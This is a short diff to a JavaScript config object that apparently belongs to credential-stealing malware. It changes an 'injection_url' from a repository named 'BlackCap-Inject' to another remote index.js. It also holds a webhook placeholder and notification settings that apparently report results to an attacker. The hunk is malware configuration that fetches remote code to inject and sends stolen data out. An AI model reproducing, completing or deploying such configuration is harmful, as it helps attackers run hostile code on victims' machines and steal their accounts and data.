@@ -26,7 +26,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/saintdaddy/0x44/main/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
